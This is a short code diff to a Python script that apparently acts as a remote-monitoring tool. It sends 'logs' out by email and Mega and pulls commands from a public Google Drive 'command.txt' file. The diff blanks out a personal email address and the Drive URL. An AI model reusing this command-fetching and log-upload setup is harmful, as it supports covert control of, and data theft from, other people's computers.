@@ -21,10 +21,10 @@ from mega import Mega
 import ssl
 
 # Email and Mega credentials
-EMAIL_SENDER = "shaiqhussain01@gmail.com"   # Replace with your email address
-EMAIL_RECEIVER = "shaiqhussain01@gmail.com" # Replace with the recipient email (where you want logs to be sent)
+EMAIL_SENDER = ""   # Replace with your email address
+EMAIL_RECEIVER = "" # Replace with the recipient email (where you want logs to be sent)
 EMAIL_PASS = "APP PASSWORD"          # Use the App Password here
-MEGA_EMAIL = "shaiqhussain01@gmail.com"     # Mega email
+MEGA_EMAIL = ""     # Mega email
 MEGA_PASS = "MEGA'S PASSWORD"              # Mega password
 
 # Logging configuration
@@ -39,7 +39,7 @@ logging.getLogger("requests").setLevel(logging.ERROR)
 logging.getLogger("urllib3").setLevel(logging.ERROR)
 
 # Google Drive Public URL for command.txt (Replace with your public file URL)
-COMMAND_FILE_URL = "https://drive.google.com/uc?export=download&id=1wLxOpmHKwZOLq4iDBLIAG5L-mpTV-1BQ"  # Replace with your public file URL
+COMMAND_FILE_URL = ""  # Replace with your public file URL
 
 # Function to lock the screen using Windows API
 def lock_screen():
